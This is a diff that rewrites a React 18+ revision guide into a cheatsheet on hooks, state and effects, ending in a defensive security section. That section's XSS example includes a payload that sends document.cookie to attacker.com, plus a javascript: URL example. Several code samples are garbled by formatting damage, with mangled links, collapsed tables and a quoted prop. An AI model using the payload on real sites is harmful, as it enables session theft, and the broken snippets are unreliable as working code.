@@ -1,123 +1,478 @@
-# ⚛️ The Ultimate React.js Complete Revision Guide
+# ⚛️ React 18+ — Complete Revision & Security Cheatsheet
 
-This guide is designed to take you from core React principles to advanced "10x developer" patterns, complete with essential tips, tricks, and highly curated interview questions based on modern React (React 18+ and `react.dev` documentation).
-
----
-
-## 🏗️ 1. Core Concepts: Describing the UI
-
-### **Components & JSX**
-*   **Components:** The building blocks of React. They are JavaScript functions that return markup. Always start with a capital letter (e.g., `function MyButton()`).
-*   **JSX:** A syntax extension for JavaScript. It looks like HTML but is stricter:
-    *   Tags must be closed (`<br />`).
-    *   Components must return a *single* parent element. Use Fragments (`<> ... </>`) to group elements without adding extra DOM nodes.
-    *   Use `camelCase` for attributes (e.g., `className` instead of `class`, `htmlFor` instead of `for`).
-
-### **Props (Properties)**
-*   Props are how you pass data from parent to child components. They are **read-only** (immutable).
-*   **Children Prop:** You can pass components inside other components using the special `children` prop.
-
-### **Conditional Rendering & Lists**
-*   **Conditionals:** Use standard JavaScript.
-    *   Ternary: `{isLoggedIn ? <Admin /> : <Login />}`
-    *   Logical AND: `{isLoggedIn && <Admin />}` (Beware of returning `0`! Ensure the left side is a boolean).
-*   **Lists:** Use `.map()` to render lists. **Always provide a unique `key`** (preferably a database ID) to list items. React uses keys to track which items changed, were added, or were removed.
-
-### **Keeping Components Pure**
-*   A pure component always returns the same JSX given the same inputs (props, state, context) and does not mutate pre-existing variables or objects before returning. Side effects belong in event handlers or `useEffect`.
+> 🎯 **Goal:** Master modern React fundamentals, state management, escape hatches, hooks, component patterns, and security best practices in a single comprehensive reference guide based on [react.dev](https://react.dev/learn).
 
 ---
 
-## ⚡ 2. Adding Interactivity: State & Events
+## 📋 Table of Contents
 
-### **State (`useState`)**
-*   State is a component's personal memory.
-*   `const [count, setCount] = useState(0);`
-*   **State as a Snapshot:** Setting state does *not* change the state variable in the current render. It triggers a new render where the state variable will have the new value.
-*   **Updater Functions:** If you need to compute the next state based on the previous state, pass a function: `setCount(c => c + 1)`.
-
-### **Updating Objects & Arrays in State**
-*   **Do not mutate state directly!** Treat state in React as **immutable**.
-*   **Objects:** Use the spread syntax (`...`) to copy the object, then override the changed properties.
-*   **Arrays:** Use methods that return a *new* array (`map`, `filter`, `slice`, spread syntax). Avoid mutating methods like `push`, `pop`, or `splice` on state arrays.
-
----
-
-## 🧠 3. Managing State Architectures
-
-*   **Lifting State Up:** When two components need to share state, move the state to their closest common parent and pass it down via props.
-*   **`useReducer`:** Best for complex state logic involving multiple sub-values or when the next state depends on the previous one. It consolidates state update logic in a single function outside the component.
-*   **Context API (`useContext`):** Solves "prop drilling". Context lets a parent component provide data to the entire tree below it. Best used for global data (themes, auth state).
+1. [React Fundamentals & JSX Rules](#1-react-fundamentals--jsx-rules)
+2. [Describing the UI & Component Architecture](#2-describing-the-ui--component-architecture)
+3. [Adding Interactivity & State Management](#3-adding-interactivity--state-management)
+4. [Managing State & Reducers](#4-managing-state--reducers)
+5. [Escape Hatches & Ref Engine](#5-escape-hatches--ref-engine)
+6. [Effects & Synchronizing with External Systems](#6-effects--synchronizing-with-external-systems)
+7. [React Custom Hooks Engine](#7-react-custom-hooks-engine)
+8. [Performance Optimization Architecture](#8-performance-optimization-architecture)
+9. [React Security Cheatsheet & Vulnerabilities](#9-react-security-cheatsheet--vulnerabilities)
+10. [60-Second Revision & Rapid-Fire Q&A](#10-60-second-revision--rapid-fire-qa)
 
 ---
 
-## 🚪 4. Escape Hatches: Refs & Effects
+# 1. React Fundamentals & JSX Rules
 
-### **Refs (`useRef`)**
-*   Refs let you reference a value that’s not needed for rendering.
-*   **Key differences from state:** Mutating a ref `ref.current = value` does *not* trigger a re-render.
-*   **Common Use Cases:** Storing timeout IDs, accessing DOM elements (e.g., focusing an input).
+React is a JavaScript library for building user interfaces out of individual pieces called **components**.
 
-### **Effects (`useEffect`)**
-*   Effects let you synchronize a component with an external system (network, DOM, browser APIs).
-*   **Syntax:** `useEffect(() => { setup(); return () => cleanup(); }, [dependencies]);`
-*   **You Might Not Need an Effect!**
-    *   *Don't* use effects to transform data for rendering (use regular variables or `useMemo`).
-    *   *Don't* use effects to handle user events (use event handlers).
-    *   Effects should strictly be for *synchronization*.
+## 🧒 Explain Like I'm 10
 
----
+Imagine playing with LEGO blocks. Each block is a **Component**. You can build a small house (a button) or combine many blocks to build a castle (a full Web App). If one block changes color, you don't rebuild the entire castle—React just updates that single block.
 
-## 🚀 5. Advanced & React 18+ Features
+## Key Principles
 
-*   **Suspense:** Lets you display a fallback (like a spinner) until its children have finished loading (data fetching or lazy-loaded code).
-*   **`useTransition`:** Lets you mark a state update as a non-blocking "transition". This keeps the UI responsive during expensive renders.
-*   **`useDeferredValue`:** Lets you defer updating a non-critical part of the UI until after critical updates have finished.
-*   **Custom Hooks:** Extract component logic into reusable functions. Custom hooks must start with `use` and can call other hooks inside them.
+- **Declarative**: Describe _what_ the UI should look like based on state, not _how_ to step-by-step manipulate DOM nodes.
+- **Component-Based**: Encapsulate code and layout into isolated, re-usable blocks.
+- **Single Direction Data Flow**: Data flows down from parent components to child components via `props`.
 
 ---
 
-## 💎 6. "10x Developer" Tips & Tricks
+## JSX (JavaScript XML) Rules
 
-1.  **Stop using `useEffect` for derived state:** If a value can be computed from existing props or state, calculate it directly during render. It saves unnecessary re-renders.
-2.  **Avoid Stale Closures:** If your `useEffect` or `useCallback` is using old state values, you forgot to add them to the dependency array. Alternatively, use the state updater function `setState(prev => prev + 1)` which doesn't require `state` in the dependency array.
-3.  **Use `key` to reset state:** If you want to completely unmount and remount a component (and reset its internal state), pass a different `key` prop to it from the parent.
-4.  **Debounce API calls with Custom Hooks:** Create a `useDebounce(value, delay)` hook to avoid spamming the backend on search inputs.
-5.  **Memoization (`useMemo`, `useCallback`, `React.memo`):** Don't prematurely optimize! Only memoize expensive calculations or component trees that are noticeably slow. Overusing them adds overhead.
-6.  **Clean up your Effects:** Always return a cleanup function in `useEffect` when dealing with subscriptions, event listeners, or timers to prevent memory leaks.
+JSX is a syntax extension for JavaScript that lets you write HTML-like markup inside a JavaScript file.
 
----
+1. **Return a single root element**: Wrap siblings in a single parent tag or a Fragment (`<>...</>`).
+2. **Close all tags**: Self-closing tags must end with `/` (e.g., `<img />`, `<br />`).
+3. **CamelCase attributes**: Use `className` instead of `class`, `htmlFor` instead of `for`, `onClick` instead of `onclick`.
 
-## 🎤 7. Top React Interview Questions & Answers
+```jsx
+// Correct JSX Syntax
+export default function Profile() {
+  return (
+    <>
+      <h1 className="title">User Profile</h1>
+      <img
+        src="[https://i.imgur.com/7vQD0fPs.jpg](https://i.imgur.com/7vQD0fPs.jpg)"
+        alt="Avatar"
+        className="avatar"
+      />
+    </>
+  );
+}
 
-**Q1: What is the Virtual DOM, and how does React use it?**
-*Answer:* The Virtual DOM is a lightweight JavaScript representation of the actual DOM. React keeps two copies: the current UI and the newly rendered UI. It compares them (a process called "Diffing" or "Reconciliation") to figure out the minimal set of changes needed, and then applies *only* those updates to the real DOM, making it highly performant.
+2. Describing the UI & Component Architecture
+Props (Properties)
+Props are the inputs passed to React components. Props are read-only (immutable snapshots in time).
 
-**Q2: What is the difference between passing a function to `useState` versus an initial value?**
-*Answer:* `useState(initialValue)` evaluates the initial value on every render (even though React ignores it after the initial render). If the initialization is expensive (e.g., reading from `localStorage`), use lazy initialization by passing a function: `useState(() => getExpensiveData())`. This function only runs once during the initial render.
+function Avatar({ person, size = 100 }) { // Default prop values
+  return (
+    <img
+      src={`[https://i.imgur.com/$](https://i.imgur.com/$){person.imageId}.jpg`}
+      alt={person.name}
+      width={size}
+      height={size}
+    />
+  );
+}
 
-**Q3: Explain the concept of "State as a Snapshot".**
-*Answer:* In React, state variables look like regular JavaScript variables, but they behave more like snapshots. When you call a `setState` function, it doesn't change the state in the currently executing code. It merely requests a re-render with the new state. This is why if you call `setCount(count + 1)` three times in a row, the count only increases by 1.
 
-**Q4: Why shouldn't you mutate state directly?**
-*Answer:* React relies on object identity (reference equality `===`) to determine if state has changed. If you mutate an object directly (e.g., `state.obj.a = 1`), the reference to the object remains the same. React thinks nothing changed and will skip the re-render.
+Conditional Rendering
+Use JavaScript control flow (if, &&, ternary ? :) to render UI conditionally.
 
-**Q5: What are Higher-Order Components (HOCs) and how do they compare to Custom Hooks?**
-*Answer:* HOCs are functions that take a component and return a new component (e.g., `withAuth(Profile)`). They were used for reusing component logic in the class-component era. Custom Hooks (`useAuth()`) are the modern, functional equivalent. Hooks are preferred because they avoid "wrapper hell" and make the data flow more explicit.
+function Item({ name, isPacked }) {
+  return (
+    <li className="item">
+      {/* Logical && Pattern */}
+      {name} {isPacked && '✅'}
 
-**Q6: How does `useContext` prevent prop drilling, and what is its performance caveat?**
-*Answer:* `useContext` allows deep nested components to consume state directly from a Context Provider without intermediate components needing to pass props down. The caveat: whenever the Provider's value changes, *all* components consuming that context will re-render. To optimize, split contexts (e.g., `ThemeContext` and `UserContext`) instead of putting everything into a single massive context.
+      {/* Ternary Operator Pattern */}
+      {/* {isPacked ? <del>{name + ' ✅'}</del> : name} */}
+    </li>
+  );
+}
 
-**Q7: What is the difference between `useMemo` and `useCallback`?**
-*Answer:* Both are used for performance optimization via memoization.
-*   `useMemo` caches the **result** of a function calculation.
-*   `useCallback` caches the **function definition itself**. (It is essentially `useMemo(() => fn, deps)`). Use `useCallback` when passing callbacks to optimized child components (like those wrapped in `React.memo`) to prevent unnecessary re-renders.
+⚠️ Gotcha: Avoid placing numbers on the left side of &&. Example: coins && <List /> will render 0 on screen when coins is 0. Use coins > 0 && <List /> instead.
 
-**Q8: What is `Strict Mode` in React?**
-*Answer:* `<React.StrictMode>` is a development-only tool that highlights potential problems. In React 18, it intentionally double-invokes components (render, effect setup, effect cleanup, effect setup) to help you find bugs related to impure components and missing effect cleanups.
+Rendering Lists & Keys
+Always assign a unique and stable key string/number to list items when dynamically generating sibling elements.
 
-**Q9: When should you use `useRef` over `useState`?**
-*Answer:* Use `useState` when you want the UI to update (re-render) when the data changes. Use `useRef` for mutable data that *does not* need to trigger a re-render (e.g., holding a timer ID, keeping track of previous state, or accessing a DOM node directly).
 
-**Q10: Explain React 18's Concurrent Features (`useTransition`).**
-*Answer:* React 18 introduced concurrent rendering, meaning React can interrupt, pause, or abandon a render. `useTransition` allows you to mark a state update as "non-urgent" (a transition). If an urgent update (like typing in an input) comes in, React will interrupt the transition render to keep the UI snappy and responsive.
+const people = [{ id: '0', name: 'Ada Lovelace' }, { id: '1', name: 'Alan Turing' }];
+
+function List() {
+  const listItems = people.map(person =>
+    <li key={person.id}>
+      <p>{person.name}</p>
+    </li>
+  );
+  return <ul>{listItems}</ul>;
+}
+
+🛑 Key Rule: Never use array indices (key={index}) if array items can reorder, insert, or delete. Never generate keys on the fly like key={Math.random()}.
+
+3. Adding Interactivity & State Management
+Event Handlers
+Event handlers are custom functions triggered by user interactions (clicking, typing, focusing).
+
+function Button() {
+  function handleClick(e) {
+    e.stopPropagation(); // Prevents event bubbling up parent components
+    e.preventDefault();  // Prevents browser default form submission
+    alert('Clicked!');
+  }
+
+  return <button onClick={handleClick}>Click Me</button>; // Pass, don't call!
+}
+
+Component Memory: useState
+State holds data that changes over time and triggers re-renders.
+
+import { useState } from 'react';
+
+function Counter() {
+  const [index, setIndex] = useState(0);
+
+  function handleClick() {
+    // Updater function syntax for batched/queued state updates
+    setIndex(prevIndex => prevIndex + 1);
+  }
+
+  return <button onClick={handleClick}>Count: {index}</button>;
+}
+
+State Snapshot & Batching
+Setting state does not mutate the current variable in existing running code; it requests a new render with a new state value.
+
+React batches state updates inside event handlers to prevent multi-render lag.
+
+// Batching Behavior
+function FixCounter() {
+  const [number, setNumber] = useState(0);
+
+  function handleBatch() {
+    setNumber(number + 1); // 0 + 1
+    setNumber(number + 1); // 0 + 1
+    setNumber(number + 1); // 0 + 1
+    // Final state value after re-render: 1!
+
+    // To queue multiple updates, pass an updater function:
+    // setNumber(n => n + 1);
+    // setNumber(n => n + 1);
+    // setNumber(n => n + 1);
+    // Final state value after re-render: 3!
+  }
+}
+
+Mutating State Variables (Immutability)
+Treat state as read-only. Always copy objects/arrays before setting state.
+
+// Immutable Object Updates
+const [user, setUser] = useState({ name: 'Alice', score: 10 });
+
+setUser({
+  ...user,
+  score: user.score + 1 // Override target property
+});
+
+// Immutable Array Updates
+const [items, setItems] = useState(['A', 'B']);
+
+// Add item
+setItems([...items, 'C']);
+
+// Remove item
+setItems(items.filter(item => item !== 'A'));
+
+// Transform item
+setItems(items.map(item => item === 'B' ? 'Updated B' : item));
+
+4. Managing State & Reducers
+Consolidating State Logic: useReducer
+When complex component state involves multiple sub-values or actions, replace useState with useReducer.
+
+import { useReducer } from 'react';
+
+function tasksReducer(tasks, action) {
+  switch (action.type) {
+    case 'added': {
+      return [...tasks, { id: action.id, text: action.text, done: false }];
+    }
+    case 'deleted': {
+      return tasks.filter(t => t.id !== action.id);
+    }
+    default: {
+      throw Error('Unknown action: ' + action.type);
+    }
+  }
+}
+
+export default function TaskApp() {
+  const [tasks, dispatch] = useReducer(tasksReducer, initialTasks);
+
+  function handleAddTask(text) {
+    dispatch({ type: 'added', id: Date.now(), text: text });
+  }
+}
+
+Passing Data Deeply: useContext
+Context allows a parent component to make information available to any component in the tree below it, no matter how deep, without passing props explicitly (Prop Drilling avoidance).
+
+import { createContext, useContext, useState } from 'react';
+
+// 1. Create Context
+const ThemeContext = createContext('light');
+
+export default function App() {
+  const [theme, setTheme] = useState('dark');
+
+  return (
+    // 2. Provide Context
+    <ThemeContext.Provider value="{theme}">
+      <Form/>
+    </ThemeContext.Provider>
+  );
+}
+
+function Form() {
+  // 3. Consume Context
+  const theme = useContext(ThemeContext);
+  return <div className={`theme-${theme}`}>Active Theme: {theme}</div>;
+}
+
+5. Escape Hatches & Ref Engine
+Referencing Values with useRef
+When a component needs to remember some information, but that information should not trigger new renders, use a ref.
+
+import { useRef } from 'react';
+
+export default function Timer() {
+  const intervalRef = useRef(null); // Returns { current: initialValue }
+
+  function handleStart() {
+    intervalRef.current = setInterval(() => {
+      console.log('Tick');
+    }, 1000);
+  }
+
+  function handleStop() {
+    clearInterval(intervalRef.current);
+  }
+}
+
+Differences: useState vs useRefFeatureuseStateuseRefReturns[value, setter] tuple{ current: value } objectRe-renders UI?✅ Yes, triggers re-render❌ No, updating does not renderMutable?❌ Immutable (use setter)✅ Mutable (ref.current = newValue)UsageUI Data, state syncDOM nodes, timers, non-rendered stateManipulating DOM with Refs
+
+
+Manipulating DOM with Refs
+import { useRef } from 'react';
+
+export default function Form() {
+  const inputRef = useRef(null);
+
+  function handleClick() {
+    // Direct DOM API Access
+    inputRef.current.focus();
+  }
+
+  return (
+    <>
+      <input ref={inputRef} />
+      <button onClick={handleClick}>Focus Input</button>
+    </>
+  );
+}
+
+6. Effects & Synchronizing with External Systems
+What are Effects?
+Effects let you run code after rendering so that you can synchronize your component with systems outside of React (APIs, browser DOM, WebSocket connections).
+
+⚠️ Key Rule: Effects are an escape hatch. Do not use Effects to transform data for rendering or to handle user interactions that belong in event handlers.
+
+import { useEffect, useState } from 'react';
+
+function VideoPlayer({ src, isPlaying }) {
+  const ref = useRef(null);
+
+  useEffect(() => {
+    if (isPlaying) {
+      ref.current.play();
+    } else {
+      ref.current.pause();
+    }
+  }, [isPlaying]); // Dependency Array controls execution
+
+  return <video ref={ref} src={src} />;
+}
+
+Dependency Array Options
+useEffect(() => {
+  // Runs after EVERY render
+});
+
+useEffect(() => {
+  // Runs ONLY ONCE after component mounts
+}, []);
+
+useEffect(() => {
+  // Runs on mount AND if 'a' or 'b' changed since last render
+}, [a, b]);
+
+Cleaning Up Effects
+If your Effect connects to something (WebSockets, Event Listeners, Intervals), return a cleanup function to teardown resources when unmounting or re-running.
+
+useEffect(() => {
+  const connection = createConnection(serverUrl, roomId);
+  connection.connect();
+
+  // Cleanup Function
+  return () => {
+    connection.disconnect();
+  };
+}, [serverUrl, roomId]);
+
+7. React Custom Hooks Engine
+Custom Hooks allow sharing stateful logic—not state itself—between components. Custom Hook names must start with use.
+
+import { useState, useEffect } from 'react';
+
+// Custom Hook definition
+function useOnlineStatus() {
+  const [isOnline, setIsOnline] = useState(navigator.onLine);
+
+  useEffect(() => {
+    function handleOnline() { setIsOnline(true); }
+    function handleOffline() { setIsOnline(false); }
+
+    window.addEventListener('online', handleOnline);
+    window.addEventListener('offline', handleOffline);
+
+    return () => {
+      window.removeEventListener('online', handleOnline);
+      window.removeEventListener('offline', handleOffline);
+    };
+  }, []);
+
+  return isOnline;
+}
+
+// Usage inside component
+export default function StatusBar() {
+  const isOnline = useOnlineStatus();
+  return <h1>{isOnline ? '✅ Online' : '❌ Disconnected'}</h1>;
+}
+
+8. Performance Optimization Architecture
+React relies on virtual DOM diffing. Use these APIs to optimize costly computations and unneeded child re-renders.
+
+useMemo
+Caches the result of a calculation between renders.
+import { useMemo } from 'react';
+
+function TodoList({ todos, filter }) {
+  // Recalculates only when 'todos' or 'filter' changes
+  const visibleTodos = useMemo(() => {
+    return calculateExpensiveFilter(todos, filter);
+  }, [todos, filter]);
+
+  return <ul>{visibleTodos.map(todo => <li key={todo.id}>{todo.text}</li>)}</ul>;
+}
+
+useCallback
+Caches a function definition between renders.
+
+import { useCallback } from 'react';
+
+function ProductPage({ productId, referrer }) {
+  // Prevents recreation of handleSubmit reference on every render
+  const handleSubmit = useCallback((orderDetails) => {
+    post('/product/' + productId + '/buy', {
+      referrer,
+      orderDetails,
+    });
+  }, [productId, referrer]);
+
+  return <Form onSubmit="{handleSubmit}"/>;
+}
+
+9. React Security Cheatsheet & Vulnerabilities
+React provides built-in safety controls, but specific developer coding patterns can introduce catastrophic client-side security risks.
+
+1. Cross-Site Scripting (XSS) via Unsanitized Markup
+Vulnerability Concept
+Using dangerouslySetInnerHTML bypasses React's default auto-escaping and allows arbitrary script injection execution.
+
+Vulnerable Code
+
+// 🚨 VULNERABLE TO XSS
+function UserBio({ userComment }) {
+  // If userComment contains: <img src=x onerror="fetch('[http://attacker.com/steal?c='+document.cookie](http://attacker.com/steal?c='+document.cookie))" />
+  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
+}
+
+Secure Remediation
+Avoid HTML injection. If required, sanitize user content strictly using libraries like DOMPurify.
+
+// 🔒 SECURE
+import DOMPurify from 'dompurify';
+
+function UserBio({ userComment }) {
+  const cleanHTML = DOMPurify.sanitize(userComment);
+  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
+}
+
+2. Insecure Script/URL Injections
+Vulnerability Concept
+User-controlled URLs supplied to href or src attributes using javascript: protocol can trigger script execution upon user interaction.
+
+Vulnerable Code
+// 🚨 VULNERABLE
+function UserLink({ websiteUrl }) {
+  // If websiteUrl is: "javascript:alert(document.cookie)"
+  return <a href={websiteUrl}>Visit Profile</a>;
+}
+Secure Remediation
+Validate protocol prefixes before passing URLs to DOM attributes.
+
+JavaScript
+// 🔒 SECURE
+function UserLink({ websiteUrl }) {
+  const isSafe = websiteUrl.startsWith('http://') || websiteUrl.startsWith('https://');
+  const safeUrl = isSafe ? websiteUrl : '#';
+
+  return <a href={safeUrl} rel="noopener noreferrer">Visit Profile</a>;
+}
+
+3. Server-Side Rendering (SSR) Hydration Data LeakageVulnerability ConceptEmbedding unsanitized initial state into HTML <script> tags for client hydration allows attackers to inject scripts via JSON payload modification.Vulnerable CodeJavaScript// 🚨 VULNERABLE SSR HTML TEMPLATE
+function renderHTML(initialState) {
+  return `
+    <script>
+      window.__INITIAL_STATE__ = ${JSON.stringify(initialState)};
+    </script>
+  `;
+}
+Secure RemediationSanitize < characters and stringify using serialization utilities like serialize-javascript.JavaScript// 🔒 SECURE
+import serialize from 'serialize-javascript';
+
+function renderHTML(initialState) {
+  return `
+    <script>
+      window.__INITIAL_STATE__ = ${serialize(initialState, { isJSON: true })};
+    </script>
+  `;
+}
+4. Reverse Tabnabbing VulnerabilityVulnerability ConceptOpening external links with target="_blank" allows target pages to control window.opener and redirect the original application page to a phishing payload.Remediation PatternJavaScript// 🔒 SECURE
+<a href="[https://external-site.com](https://external-site.com)" target="_blank" rel="noopener noreferrer">
+  External Portal
+</a>
+10. 60-Second Revision & Rapid-Fire Q&A🔄 Execution PipelinePlaintextComponent Trigger (Initial / State Change)
+            │
+            ▼
+React Renders Component Trees (Virtual DOM Computation)
+            │
+            ▼
+React Commits Changes to DOM Nodes
+            │
+            ▼
+Browser Paints Screen
+            │
+            ▼
+useEffect Cleanup / Effect Execution Runs
+🧠 60-Second Cheat SummaryConceptOne-Line SummaryJSXSyntax extension that produces React elements; must return single parent.PropsImmutable read-only inputs passed from parent to child.StateComponent memory; setting it queues a re-render.KeysStable, unique identifiers that help React identify list items during diffing.useRefStore mutable values without triggering component re-renders.useEffectSynchronize component state with external non-React systems.useReducerExtract complex state update logic outside components into single function.useContextBroadly broadcast props down the component tree without prop-drilling.💼 Rapid-Fire Interview QuestionsQ1. What is the difference between Virtual DOM and Real DOM?Answer:The Virtual DOM is a lightweight, in-memory representation of the actual DOM elements. React uses it to calculate minimal DOM manipulation diffs via reconciliation before applying updates efficiently to the real DOM.Q2. Why shouldn't you mutate state directly in React?Answer:Direct state mutation (state.a = 5) does not notify React that state changed. State must be updated using setter functions (setState) or reducers to trigger component re-rendering cycles.Q3. Why do Hooks need to be called at the top level of a component?Answer:React relies on the order in which Hooks are called across renders to preserve state across calls. Placing Hooks inside conditions or loops breaks the array indexing order React uses internally.Q4. What causes infinite re-renders with useEffect?Answer:Updating a state variable inside useEffect without specifying a dependency array, or including that updated state variable inside the dependency array itself.Q5. What is the difference between useMemo and useCallback?Answer:useMemo caches the result of executing a calculation/function, while useCallback caches the function instance itself.
+```
